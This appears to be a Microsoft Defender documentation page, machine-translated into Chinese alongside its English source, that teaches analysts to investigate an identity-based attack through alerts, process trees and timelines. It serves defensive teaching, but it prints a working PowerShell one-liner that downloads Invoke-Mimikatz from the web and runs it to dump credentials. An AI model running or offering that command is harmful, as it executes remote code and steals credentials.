---
title: 以身分識別的攻擊範例
description: 逐步分析身分識別攻擊的範例。
keywords: 事件、警示、調查、關聯性、攻擊、電腦、裝置、使用者、identity、身分識別、信箱、電子郵件、365、microsoft、m365、事件回應、網路攻擊
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: zh-TW
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841003"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="91d64-104">以身分識別的攻擊範例</span><span class="sxs-lookup"><span data-stu-id="91d64-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="91d64-105">**適用於：**</span><span class="sxs-lookup"><span data-stu-id="91d64-105">**Applies to:**</span></span>
- <span data-ttu-id="91d64-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="91d64-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="91d64-107">Microsoft Defender for Identity 可協助偵測到危及組織中身分識別的惡意企圖。</span><span class="sxs-lookup"><span data-stu-id="91d64-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="91d64-108">由於您的身分識別與 Microsoft 365 的 defender 整合，安全性分析程式可以深入瞭解來自于 defender 進行身分識別的威脅，例如，可疑的 Netlogon 許可權提升嘗試。</span><span class="sxs-lookup"><span data-stu-id="91d64-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="91d64-109">在 Microsoft Defender 身分識別中分析攻擊</span><span class="sxs-lookup"><span data-stu-id="91d64-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="91d64-110">Microsoft 365Defender 可讓分析員根據「事件」頁面之 [**警示**] 索引標籤上的偵測來源來篩選警示。</span><span class="sxs-lookup"><span data-stu-id="91d64-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="91d64-111">在下列範例中，會將偵測來源篩選為身分 **識別的 Defender**。</span><span class="sxs-lookup"><span data-stu-id="91d64-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="篩選用於身分識別之 Defender 的偵測來源的範例":::

<span data-ttu-id="91d64-113">選取 **置疑的 overpass-雜湊攻擊** 警示會移至 Microsoft Cloud App Security 中顯示更詳細資訊的頁面。</span><span class="sxs-lookup"><span data-stu-id="91d64-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="91d64-114">您可以選擇 **深入瞭解此警示類型** 以閱讀有關 [攻擊的描述](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) 和修正建議，以進一步瞭解警示或攻擊。</span><span class="sxs-lookup"><span data-stu-id="91d64-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="可疑 overpass-雜湊攻擊警示的範例"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="91d64-116">調查 Microsoft Defender for Endpoint 中的相同攻擊</span><span class="sxs-lookup"><span data-stu-id="91d64-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="91d64-117">另外，分析員也可以使用 Defender for Endpoint 來深入瞭解端點上的活動。</span><span class="sxs-lookup"><span data-stu-id="91d64-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="91d64-118">選取事件佇列中的事件，然後選取 [ **警示** ] 索引標籤。在這裡，他們也可以識別偵測來源。</span><span class="sxs-lookup"><span data-stu-id="91d64-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="91d64-119">標示為 EDR 的偵測來源會代表端點偵測和回應，也就是端點的 Defender。</span><span class="sxs-lookup"><span data-stu-id="91d64-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="91d64-120">在此，分析員會選取 EDR 所偵測到的警示。</span><span class="sxs-lookup"><span data-stu-id="91d64-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Defender for Endpoint 中端點偵測及回應的範例"::: 

<span data-ttu-id="91d64-122">警示頁面會顯示各種相關資訊，例如受影響裝置名稱、使用者名稱、自動調查的狀態及警示詳細資料。</span><span class="sxs-lookup"><span data-stu-id="91d64-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="91d64-123">警示案例會顯示流程樹狀目錄的視覺表示。</span><span class="sxs-lookup"><span data-stu-id="91d64-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="91d64-124">處理樹狀目錄是與警示相關的父項與子流程的階層式表示。</span><span class="sxs-lookup"><span data-stu-id="91d64-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Defender for Endpoint 中的警示處理樹狀目錄範例"::: 

<span data-ttu-id="91d64-126">您可以展開每個流程以查看其他詳細資料。</span><span class="sxs-lookup"><span data-stu-id="91d64-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="91d64-127">分析員所看到的詳細資料為惡意腳本的一部分所輸入的實際命令、輸出連線 IP 位址及其他有用資訊。</span><span class="sxs-lookup"><span data-stu-id="91d64-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Defender for Endpoint 中處理常式詳細資料的範例":::
 
<span data-ttu-id="91d64-129">透過選擇 [ **在時程表中查看**]，分析員甚至可以進一步深入判斷是否有損損的確切時間。</span><span class="sxs-lookup"><span data-stu-id="91d64-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="91d64-130">Microsoft Defender for Endpoint 可以偵測許多惡意檔和腳本。</span><span class="sxs-lookup"><span data-stu-id="91d64-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="91d64-131">不過，由於輸出連線、PowerShell 和命令列活動有許多合法用途，所以部分活動會被視為良性，直到它建立惡意檔或活動為止。</span><span class="sxs-lookup"><span data-stu-id="91d64-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="91d64-132">因此，使用時間表可協助分析員將警示放入與周邊活動的內容，以判斷一般檔案系統和使用者活動所遮住的攻擊原始來源或時間。</span><span class="sxs-lookup"><span data-stu-id="91d64-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="91d64-133">為做到這一點，在警示偵測 (會從紅色) 中開始，然後向下按，以判斷導致惡意活動實際開始的時間。</span><span class="sxs-lookup"><span data-stu-id="91d64-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="在警示偵測時開始的範例"::: 

<span data-ttu-id="91d64-135">請務必瞭解及區別一般活動，例如 Windows 更新連線、Windows 信任的軟體啟用流量、其他與 Microsoft 網站的常見連線、協力廠商網際網路活動、Microsoft Endpoint Configuration Manager 活動，以及其他可疑活動的誤報活動。</span><span class="sxs-lookup"><span data-stu-id="91d64-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="91d64-136">若要達到此目的，一種方法是使用時間表篩選器。</span><span class="sxs-lookup"><span data-stu-id="91d64-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="91d64-137">有許多篩選可以反白顯示特定的活動，篩選出分析員不想要查看的任何專案。</span><span class="sxs-lookup"><span data-stu-id="91d64-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="91d64-138">在下圖中，分析員已篩選為只查看網路和進程事件。</span><span class="sxs-lookup"><span data-stu-id="91d64-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="91d64-139">這可讓分析員查看記事本所建立之事件的網路連線與處理常式，其中的是透過 IP 位址建立連線，我們也會在處理樹狀目錄中看到。</span><span class="sxs-lookup"><span data-stu-id="91d64-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="記事本如何用來進行惡意的輸出連線的範例"::: 

<span data-ttu-id="91d64-141">在此特定事件中，記事本是用來進行惡意的輸出連線。</span><span class="sxs-lookup"><span data-stu-id="91d64-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="91d64-142">不過，攻擊者只會使用 iexplorer.exe 建立連線來下載惡意的負載，因為一般 iexplorer.exe 進程會被視為一般網頁瀏覽器活動。</span><span class="sxs-lookup"><span data-stu-id="91d64-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="91d64-143">時程表中另一個要尋找的專案會是 PowerShell 輸出連線的使用方式。</span><span class="sxs-lookup"><span data-stu-id="91d64-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="91d64-144">分析師會尋找成功的 PowerShell 連線，其方式如下 `IEX (New-Object Net.Webclient)` ：主控惡意檔之網站的輸出連線。</span><span class="sxs-lookup"><span data-stu-id="91d64-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="91d64-145">在下列範例中，PowerShell 是用來從網站下載並執行 Mimikatz：</span><span class="sxs-lookup"><span data-stu-id="91d64-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="91d64-146">分析員可以在搜尋列中輸入關鍵字，以快速搜尋關鍵字，只顯示使用 PowerShell 所建立的事件。</span><span class="sxs-lookup"><span data-stu-id="91d64-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="91d64-147">下一步</span><span class="sxs-lookup"><span data-stu-id="91d64-147">Next step</span></span>

<span data-ttu-id="91d64-148">請參閱 [網路釣魚](first-incident-path-phishing.md) 調查路徑。</span><span class="sxs-lookup"><span data-stu-id="91d64-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="91d64-149">另請參閱</span><span class="sxs-lookup"><span data-stu-id="91d64-149">See also</span></span>

- [<span data-ttu-id="91d64-150">事件概觀</span><span class="sxs-lookup"><span data-stu-id="91d64-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="91d64-151">管理事件</span><span class="sxs-lookup"><span data-stu-id="91d64-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="91d64-152">調查事件</span><span class="sxs-lookup"><span data-stu-id="91d64-152">Investigate incidents</span></span>](investigate-incidents.md)
